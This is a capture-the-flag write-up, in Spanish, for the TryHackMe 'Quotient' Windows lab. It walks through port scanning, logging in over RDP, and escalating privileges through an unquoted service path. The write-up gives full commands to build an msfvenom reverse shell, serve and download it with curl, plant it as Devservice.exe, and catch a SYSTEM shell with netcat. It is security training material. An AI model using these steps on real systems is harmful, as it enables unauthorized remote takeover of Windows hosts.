## TryHackMe  <> Quotient

![image](https://github.com/Esevka/CTF/assets/139042999/28759a27-063b-4694-990c-876288262a90)

## Datos del enunciado.

  ![image](https://github.com/Esevka/CTF/assets/139042999/d79d40fe-9701-4546-a261-706364b36ec9)

Info -> La maquina no responde a trazas ICMP(ping)

---
---

## Escaneo de puertos

  Aunque nos diga en el enunciado que nos conectemos a la maquina por el servicio RDP, haremos un escaneo
	de la maquina en busca de puertos abiertos.

		┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/nmap]
		└─# nmap -p- --open -sS --min-rate 5000 -n -Pn -sCV -vvv 10.10.246.164 -o open_ports
		PORT     STATE SERVICE       REASON          VERSION
		3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
		|_ssl-date: 2023-07-08T11:39:57+00:00; 0s from scanner time.
		| rdp-ntlm-info: 
		|   Target_Name: THM-QUOTIENT
		|   NetBIOS_Domain_Name: THM-QUOTIENT
		|   NetBIOS_Computer_Name: THM-QUOTIENT
		|   DNS_Domain_Name: thm-quotient
		|   DNS_Computer_Name: thm-quotient
		|   Product_Version: 10.0.17763
		|_  System_Time: 2023-07-08T11:39:53+00:00
		| ssl-cert: Subject: commonName=thm-quotient
		| Issuer: commonName=thm-quotient
		| Public Key type: rsa
		| Public Key bits: 2048
		| Signature Algorithm: sha256WithRSAEncryption
		| Not valid before: 2023-07-07T11:32:25
		| Not valid after:  2024-01-06T11:32:25
		| MD5:   b2b857fa56054d1465375d4e2e3f65b3
		| SHA-1: 347f0b3305a68447ddb32cfac84f2d651a2524e1
		| -----BEGIN CERTIFICATE-----
		| MIIC3DCCAcSgAwIBAgIQcba9rkDbYZxF0CE0X+9BFzANBgkqhkiG9w0BAQsFADAX
		| MRUwEwYDVQQDEwx0aG0tcXVvdGllbnQwHhcNMjMwNzA3MTEzMjI1WhcNMjQwMTA2
		| MTEzMjI1WjAXMRUwEwYDVQQDEwx0aG0tcXVvdGllbnQwggEiMA0GCSqGSIb3DQEB
		| AQUAA4IBDwAwggEKAoIBAQDRSKedf05O4qY+MD3wFXACWO29XCwScBrAitmGlTwu
		| /AXSK9aVxVL2nhtV+3RbdlU/cCgIpSDpTrRAy4FkW0PMJndXU6vMAs6foczd5F+l
		| iyXYg0WFPIs5/DbMu5Q/t9CjH54/ZXoV5pq/IAmbKxBiUoNZGGtslb2Fe7DZ0vgR
		| RXAKV7tUaLdlFK7EffCIJOGxa1cmC8RMArmFYGw9YPlir5q/xffvMyoaN2hnm8o5
		| zkgOqyhrgJSPo3Mbqwhpl8XwPQ5ridJLnYH3adhTnKm3FqRD3B/qBmP1Q4yDqjJx
		| jyVIh9fzN9BDTOHVYOTiaForMwD+yG7FnEUrREiQ7WUhAgMBAAGjJDAiMBMGA1Ud
		| JQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEA
		| XlSv/p0jnMjSuM9Pl6uIb7HA3AiTff9A8vvPc+W3gL7umSEAqAac039WLWxJ/pyW
		| UnRmVRPFGGgRdZA7JxnNxSJaXTcXHQViydAfXdmuzdhskAQZRPvVoNodxjFvBdMU
		| A4yCyafiLGfXwsy+ijLbn5hJGKm+cHqKWBNHFXP3sjirx+i2At5NnsSuVjalC4/e
		| uALmgTaPCnsRolxgpCZNfS0r7UiT6smVJc4NINZSVsLdy+KAc/I/esZBvIm2h/Xm
		| 6EKrLBNoId1Kz85wN3YgLpiCjDZiSY+eIAOAfAuuHHQAfjitxE9UTMhLyLMC2E49
		| pPfVvYVlXEznEvNXyKfXmw==
		|_-----END CERTIFICATE-----
		Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Conexion a Microsoft Terminal Services

  Nos conectamos al servicio RDP, esto nos nos muestra una ventana de escritorio remoto donde podemos 
	trabajar con la maquina windows (victima), utilizamos las credenciales que nos entregan en el enunciado.

	┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/nmap]
	└─# xfreerdp /v:10.10.246.164:3389 /u:sage /p:'gr33ntHEphgK2&V'

## Explotacion de vulnerabilidades

Navegando por los distintos directorios encontramos algo interesante.
	
	c:\Program Files\Development Files\Devservice Files>
		03/07/2022  04:03 AM         5,966,336 Service.exe  

Buen rato despues tras buscar info sobre el binario Service.exe  por la maquina, task manager, servicios que estan corriendo etc, encontramos que dicho binario es parte de un servicio llamado "Development Service", dicho servicio tiene el tipo de inicio automatico y el path de ejecucion siguiente.

    c:\Program Files\Development Files\Devservice FilesService.exe

Vemos que el path de ejecucion no esta entre "", por lo que puede ser explotado a traves de un ataque llamado Unquoted Service Paths.
Explicacion mas detallada del ataque --> https://deephacking.tech/unquoted-service-paths-privilege-escalation-en-windows/

Todo lo anterior tambien lo podemos ver con el comando sc.

		C:\Users\Sage>sc qc "Development Service" 

		     [SC] QueryServiceConfig SUCCESS

		     SERVICE_NAME: Development Service                                                                                                    
		     TYPE               : 10  WIN32_OWN_PROCESS                                                                                   
		     START_TYPE         : 2   AUTO_START                                                                                          
		     ERROR_CONTROL      : 1   NORMAL                                                                                              
		     BINARY_PATH_NAME   : C:\Program Files\Development Files\Devservice Files\Service.exe                                         
		     LOAD_ORDER_GROUP   :                                                                                                         
		     TAG                : 0                                                                                                       
		     DISPLAY_NAME       : Developmenet Service                                                                                    
		     DEPENDENCIES       :                                                                                                         
		     SERVICE_START_NAME : LocalSystem
       
  SERVICE_START_NAME : LocalSystem   ----> INFO (https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)

---

  Por lo que llegados a este punto, podriamos crear una reverse shell, realizando el ataque Unquoted Service Paths y ver si esto nos entrega una shell como administrador de la maquina.

## Escalando privilegios (nt authority\system)

Creamos la reverse shell con msfvenom y la pasamos a la maquina victima, a la ruta adecuada, con el nombre adecuado.

	┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/script]
	└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.64.232 LPORT=1988 -f exe -o reverse.exe
	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	[-] No arch selected, selecting arch: x64 from the payload
	No encoder specified, outputting raw payload
	Payload size: 460 bytes
	Final size of exe file: 7168 bytes
	Saved as: reverse.exe
	
Creamos un servidor http en nuestra maquina para compartir la shell.

		┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/script]
		└─# python3 -m http.server 80                           
		Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Nos descargamos la shell en la maquina victima

		c:\Program Files\Development Files>curl http://10.8.64.232/reverse.exe -o Devservice.exe 
		    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                          Dload  Upload   Total   Spent    Left  Speed                                           100  7168  100  7168    0     0  28789      0 --:--:-- --:--:-- --:--:-- 28903                                                                                                                                                                  
		    c:\Program Files\Development Files>dir                                                                                   
		    Volume in drive C has no label.                                                                                         
		    Volume Serial Number is 4448-19F9                                                                                                                                                                                                               
		    Directory of c:\Program Files\Development Files                                                                                                                                                                                               
		     07/09/2023  09:20 AM    <DIR>          .                                                                                
		     07/09/2023  09:20 AM    <DIR>          ..                                                                               
		     03/07/2022  04:03 AM    <DIR>          Devservice Files                                                                 
		     07/09/2023  09:20 AM             7,168 Devservice.exe                                                                                  
		     1 File(s)          7,168 bytes                                                                                          
		     3 Dir(s)  25,144,979,456 bytes free  

Nos ponemos en escucha con netcat en nuesta maquina atacante.

		┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/script]
		└─# nc -lnvp 1988            
		listening on [any] 1988 ...


Reiniciamos la maquina windows

    c:\Program Files\Development Files>shutdown /r /t 00 

Si todo esta correcto debemos recibir nuestra shell.

		┌──(root㉿kali)-[/home/…/Desktop/ctf/quotient/script]
		└─# nc -lnvp 1988            
		listening on [any] 1988 ...
		connect to [10.8.64.232] from (UNKNOWN) [10.10.39.91] 49670
		Microsoft Windows [Version 10.0.17763.3165]
		(c) 2018 Microsoft Corporation. All rights reserved.

		C:\Windows\system32>whoami
			whoami
			nt authority\system

		c:\Users\Administrator\Desktop>type flag.txt
			type flag.txt
			THM{flag}
---

   

---> Maquina  Quotient completa <---






